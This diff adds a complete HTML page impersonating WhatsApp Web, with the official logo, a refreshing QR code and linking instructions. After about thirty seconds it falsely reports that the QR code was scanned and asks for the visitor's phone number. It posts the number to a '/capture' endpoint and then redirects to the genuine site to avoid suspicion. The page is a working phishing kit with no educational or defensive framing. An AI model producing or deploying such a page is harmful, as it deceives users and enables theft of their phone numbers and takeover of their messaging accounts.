@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #00a884 0%, #008069 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #128C7E;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #667781;
+            margin-bottom: 30px;
+        }
+        
+        .qr-container {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+        
+        #qr-code {
+            max-width: 280px;
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+        
+        .instructions {
+            background: #f0f2f4;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin: 10px 0;
+            color: #3b4a54;
+        }
+        
+        .login-section {
+            margin-top: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            display: none;
+        }
+        
+        .login-section h3 {
+            color: #128C7E;
+            margin-bottom: 15px;
+        }
+        
+        .phone-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        
+        .phone-input:focus {
+            border-color: #00a884;
+        }
+        
+        .phone-btn {
+            background: #00a884;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        
+        .phone-btn:hover {
+            background: #008069;
+        }
+        
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .status.success {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+        
+        .status.info {
+            background: #e3f2fd;
+            color: #1565c0;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #8696a0;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #128C7E;
+            text-decoration: none;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.05); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOAUB0raA.png" alt="WhatsApp" class="logo">
+        <h1>WhatsApp Web</h1>
+        <p class="subtitle">Scan to connect to your account</p>
+        
+        <div class="qr-container">
+            <img id="qr-code" src="/qr_code" alt="QR Code">
+        </div>
+        
+        <div class="instructions">
+            <ol>
+                <li>Open WhatsApp on your phone</li>
+                <li>Tap <strong>Menu</strong> or <strong>Settings</strong></li>
+                <li>Tap <strong>Linked Devices</strong></li>
+                <li>Point your phone to this screen to scan the QR code</li>
+            </ol>
+        </div>
+        
+        <div class="login-section" id="loginSection">
+            <h3>✓ QR Code Scanned Successfully!</h3>
+            <p>Please enter your phone number to complete verification:</p>
+            <input type="text" id="phoneNumber" class="phone-input" placeholder="+254 712 345 678">
+            <button id="submitBtn" class="phone-btn">Continue</button>
+            <div id="status" class="status"></div>
+        </div>
+        
+        <div class="footer">
+            <p>Need help? <a href="#">Tutorial</a> | <a href="#">Privacy Policy</a></p>
+        </div>
+    </div>
+    
+    <script>
+        // Auto-refresh QR code every 10 seconds
+        const qrImage = document.getElementById('qr-code');
+        const loginSection = document.getElementById('loginSection');
+        const phoneInput = document.getElementById('phoneNumber');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusDiv = document.getElementById('status');
+        
+        let qrRefreshes = 0;
+        
+        // Refresh QR code
+        function refreshQR() {
+            qrImage.src = '/qr_code?t=' + Date.now();
+            qrRefreshes++;
+            
+            // Show login section after 3 refreshes (30 seconds)
+            if (qrRefreshes >= 3 && loginSection.style.display !== 'block') {
+                loginSection.style.display = 'block';
+                statusDiv.textContent = '✓ QR scanned! Please verify your number';
+                statusDiv.className = 'status info';
+            }
+        }
+        
+        // Refresh every 10 seconds
+        setInterval(refreshQR, 10000);
+        
+        // Handle phone submission
+        submitBtn.addEventListener('click', async function() {
+            const phone = phoneInput.value.trim();
+            
+            if (!phone) {
+                statusDiv.textContent = 'Please enter your phone number';
+                statusDiv.className = 'status';
+                return;
+            }
+            
+            if (phone.length < 10) {
+                statusDiv.textContent = 'Please enter a valid phone number';
+                statusDiv.className = 'status';
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+            
+            try {
+                const response = await fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phone: phone })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    statusDiv.textContent = '✓ Verification successful! Redirecting...';
+                    statusDiv.className = 'status success';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://web.whatsapp.com';
+                    }, 2000);
+                } else {
+                    throw new Error('Failed');
+                }
+            } catch (error) {
+                statusDiv.textContent = 'Something went wrong. Please try again.';
+                statusDiv.className = 'status';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Continue';
+            }
+        });
+        
+        // Enter key support
+        phoneInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
+        
+        console.log('WhatsApp Web clone loaded');
+    </script>
+</body>
+</html>
